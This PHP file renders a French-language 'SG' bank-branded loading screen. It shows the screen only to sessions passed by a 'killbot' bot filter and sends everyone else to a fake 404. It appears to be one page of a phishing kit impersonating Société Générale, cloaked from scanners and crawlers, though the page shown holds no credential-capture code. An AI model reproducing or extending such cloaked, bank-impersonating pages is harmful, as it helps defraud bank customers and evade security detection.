<?php

include '../server/all.php';
include '../settings.php';

if(isset($_SESSION['killbot_autorisé']) && $_SESSION['killbot_autorisé'] === true   ) {
?>

<!DOCTYPE html>
<html lang="fr">
<head>     
  
    <meta name='robots' content='noindex, nofollow' />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
    <title>SG | Chargement en cours... </title>
    <link rel="stylesheet" type="text/css" href="">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta name="theme-color" content="#fff">
    <meta charset="UTF-8">
    <link rel="icon" type="image/x-icon" href="../assets/favicon.ico">
    <meta name="theme-color" content="#fff">      
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link rel="stylesheet" type="text/css" href="../assets/css/loader.css">


</head>
<html>

<body class="sfrDom sfrRN" style="margin: 0px; width: initial; height: auto;">
    <div id="globalspinner" class="sfr">       
        <div class="wrapper">
            <div class="lds-ring">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
               
            </div>
            
        </div>
        <br>
        <div style="font-family: 'Arial';color : black;font-weight: bold;" class="bl_text h3">Veuillez patienter ...</div>
    </div>

    <script src='../assets/js/script.js'></script>
  
</body>
</html>
<?php
}

else {
    session_destroy();
    header("Location: ../404.php");
    exit;
} ?>